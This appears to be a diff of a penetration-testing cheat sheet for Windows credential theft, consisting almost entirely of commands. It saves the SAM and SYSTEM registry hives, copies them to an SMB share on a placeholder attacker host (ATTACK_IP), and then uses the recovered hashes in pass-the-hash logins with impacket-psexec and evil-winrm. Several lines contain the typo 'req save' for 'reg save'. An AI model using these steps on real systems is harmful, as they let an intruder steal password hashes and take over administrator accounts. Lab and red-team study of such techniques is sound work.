@@ -6,31 +6,31 @@
 
 #### 1: Backup SAM and SYSTEM hashes
 
-#### cd /
+ - cd /
 
-#### mkdir temp
+ - mkdir temp
 
-#### cd temp
+ - cd temp
 
-#### req save hklm\system c:\temp\system
+ - req save hklm\system c:\temp\system
 
-#### req save hklm\sam c:\temp\sam
+ - req save hklm\sam c:\temp\sam
 
-#### download sam
+ - download sam
 
-#### download system
+ - download system
 
 #### 2: Create SMB Server on attacking machine
 
-#### 1: mkdir share
+ - 1: mkdir share
 
-#### 2: python3 impacket-smbserver.py -smb2support -username USER -password PASSWORD public share
+ - 2: impacket-smbserver -smb2support -username USER -password PASSWORD public share
 
 #### 3: Copy backups to share folder
 
-#### copy c:\users\user\sam.hive \\ATTACK_IP\public\
+- copy c:\users\user\sam.hive \\ATTACK_IP\public\
 
-#### copy c:\users\user\system.hive \\ATTACK_IP\public\
+- copy c:\users\user\system.hive \\ATTACK_IP\public\
 
 #### 4: Retrieve hashes
 
@@ -42,9 +42,11 @@
 
 #### 5: Pass-The-Hash Attack (PtH)
 
-#### python3 impacket-psexec.py -hashes HASH administrator@TARGET_IP
+- impacket-psexec -hashes HASH administrator@TARGET_IP
 
 #### TIP: We can also use evil-winrm for PtH attacks.
+
+- evil-winrm -i TARGET_IP -u administrator -H 'NTLM_HASH'
 
 ## Alternate Method to transfer the Hives: reg.py  remotely on Linux
 
